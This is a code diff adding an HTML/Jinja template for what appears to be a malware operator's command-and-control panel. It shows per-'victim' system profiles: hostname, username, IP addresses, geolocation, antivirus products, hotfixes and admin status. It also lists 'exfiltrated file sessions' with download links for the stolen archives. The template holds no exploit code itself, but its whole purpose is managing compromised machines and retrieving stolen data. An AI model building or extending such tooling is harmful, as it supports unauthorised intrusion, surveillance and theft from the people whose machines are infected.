@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Victim Details - {{ victim_hash }}</title>
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        body { 
+            padding-top: 20px; 
+            padding-bottom: 20px; 
+            background-color: #2c3034; 
+            color: #f8f9fa; 
+        }
+        .card { 
+            background-color: #343a40; 
+            border: 1px solid #454d55; 
+            margin-bottom: 20px;
+            height: 100%;
+        }
+        .card-header, .card-title { 
+            color: #00beef; 
+        }
+        .card-header {
+            border-bottom: 1px solid #00beef40;
+        }
+        .list-group-item {
+            background-color: #3E444A;
+            border-color: #454d55;
+            color: #f8f9fa;
+            word-wrap: break-word;
+        }
+        .list-group-item strong {
+            color: #00beefc0;
+            margin-right: 5px;
+        }
+        a { color: #00beef; }
+        a:hover { color: #00a0c7; text-decoration: none;}
+        .btn-outline-light { color: #f8f9fa; border-color: #f8f9fa80; }
+        .btn-outline-light:hover { background-color: #f8f9fa; color: #2c3034; }
+        h1, h2 { color: #00beef; }
+        hr.my-2 { border-top: 1px solid #454d55; }
+        .row {
+            display: flex;
+            flex-wrap: wrap;
+        }
+        .col-md-6 {
+            display: flex;
+            flex-direction: column;
+        }
+        /* 테이블 스타일 추가 */
+        .table-dark th {
+            background-color: #3E444A;
+        }
+        .scrollable-table {
+            max-height: 220px; 
+            overflow-y: auto; 
+            border: 1px solid #454d55; 
+            border-radius: 0.25rem;
+        }
+        .scrollable-table thead th {
+            position: sticky;
+            top: 0;
+            z-index: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="card shadow-sm mb-4">
+            <div class="card-header d-flex justify-content-between align-items-center">
+                <h1 class="mb-0 h3"><i class="fas fa-user-secret mr-2"></i>Details for Victim {{ victim_hash }}</h1>
+                <a href="{{ url_for('index') }}" class="btn btn-outline-light btn-sm"><i class="fas fa-arrow-left mr-1"></i>Back to Dashboard</a>
+            </div>
+        </div>
+
+        <div class="row">
+            <div class="col-md-6 mb-4">
+                <div class="card shadow-sm">
+                    <div class="card-body">
+                        <h2 class="card-title h4"><i class="fas fa-id-card mr-2"></i>Victim Information</h2>
+                        <ul class="list-group list-group-flush">
+                            <li class="list-group-item"><strong>Victim Hash:</strong> {{ victim_hash }}</li>
+                            <li class="list-group-item"><strong>First Seen (UTC):</strong> {{ first_seen }}</li>
+                            <li class="list-group-item"><strong>Last Seen (UTC):</strong> {{ last_seen }}</li>
+                            {% if system_info %}
+                                <li class="list-group-item"><strong>Operating System:</strong> {{ system_info.get('os', 'N/A') }}</li>
+                                <li class="list-group-item"><strong>Hostname:</strong> {{ system_info.get('hostname', 'N/A') }}</li>
+                                <li class="list-group-item"><strong>Username:</strong> {{ system_info.get('username', 'N/A') }}</li>
+                                <li class="list-group-item"><strong>Internal IP:</strong> {{ system_info.get('internal_ip', 'N/A') }}</li>
+                                <li class="list-group-item"><strong>Architecture:</strong> {{ system_info.get('architecture', 'N/A') }}</li>
+                                <li class="list-group-item"><strong>Agent Version:</strong> {{ system_info.get('agent_version', 'N/A') }}</li>
+                            {% else %}
+                                <li class="list-group-item"><strong>System Info:</strong> Not Available</li>
+                            {% endif %}
+                            
+                            <li class="list-group-item">
+                                <strong>Antivirus:</strong>
+                                {% if system_info.security and system_info.security.antivirus %}
+                                    <ul class="list-unstyled mb-0 pt-1" style="padding-left: 1rem;">
+                                    {% for av in system_info.security.antivirus %}
+                                        <li><i class="fas fa-shield-alt fa-fw mr-2 text-info"></i>{{ av }}</li>
+                                    {% endfor %}
+                                    </ul>
+                                {% else %}
+                                    N/A
+                                {% endif %}
+                            </li>
+                            
+                            <li class="list-group-item">
+                                <strong>Installed Hotfixes:</strong>
+                                {% if system_info.security and system_info.security.hotfixes %}
+                                    <div class="scrollable-table mt-2">
+                                        <table class="table table-sm table-dark table-hover mb-0">
+                                            <thead>
+                                                <tr>
+                                                    <th>ID</th>
+                                                    <th>Description</th>
+                                                    <th>Installed On</th>
+                                                </tr>
+                                            </thead>
+                                            <tbody>
+                                                {% for hf in system_info.security.hotfixes %}
+                                                <tr>
+                                                    <td><a href="https://support.microsoft.com/kb/{{ hf.HotFixID.replace('KB', '') }}" target="_blank">{{ hf.HotFixID }}</a></td>
+                                                    <td>{{ hf.Description }}</td>
+                                                    <td>{{ hf.InstalledOn }}</td>
+                                                </tr>
+                                                {% endfor %}
+                                            </tbody>
+                                        </table>
+                                    </div>
+                                {% else %}
+                                    N/A
+                                {% endif %}
+                            </li>
+
+                            <li class="list-group-item"><strong>Public IP:</strong> {{ system_info.get('public_ip', 'N/A') }}</li>
+                            {% if system_info.get('geolocation') %}
+                                <li class="list-group-item"><strong>Location:</strong> 
+                                    <i class="fas fa-map-marker-alt"></i> 
+                                    {{ system_info['geolocation'].get('city', 'N/A') }}, {{ system_info['geolocation'].get('country', 'N/A') }}
+                                </li>
+                                <li class="list-group-item"><strong>ISP:</strong> {{ system_info['geolocation'].get('isp', 'N/A') }}</li>
+                            {% endif %}
+                            <li class="list-group-item">
+                                <strong>Privileges:</strong> 
+                                {% if system_info.get('is_admin') %}
+                                    <span class="badge badge-danger"><i class="fas fa-user-shield"></i> Administrator</span>
+                                {% else %}
+                                    <span class="badge badge-info"><i class="fas fa-user"></i> Standard User</span>
+                                {% endif %}
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-lg-6 mb-4">
+                <div class="card shadow-sm">
+                    <div class="card-body">
+                        <h2 class="card-title h4"><i class="fas fa-archive mr-2"></i>Exfiltrated File Sessions ({{ sessions_info | length }})</h2>
+                        {% if sessions_info %}
+                        <div class="list-group">
+                            {% for sess in sessions_info %}
+                            <div class="list-group-item d-flex justify-content-between align-items-center mb-2">
+                                <h5 class="mb-0 h6">{{ sess.name }}</h5>
+                                <div>
+                                    {% if sess.has_exfil %}
+                                        <a href="{{ url_for('download_restored_exfil_file', victim_hash=victim_hash, session_name=sess.name) }}" class="btn btn-sm btn-success">
+                                            <i class="fas fa-file-download mr-1"></i>Download ZIP
+                                        </a>
+                                    {% else %}
+                                        <span class="text-muted font-italic">No exfiltrated file for this session</span>
+                                    {% endif %}
+                                </div>
+                            </div>
+                            {% endfor %}
+                        </div>
+                        {% else %}
+                        <p class="text-muted">No session data found for this victim.</p>
+                        {% endif %}
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+</body>
+</html>
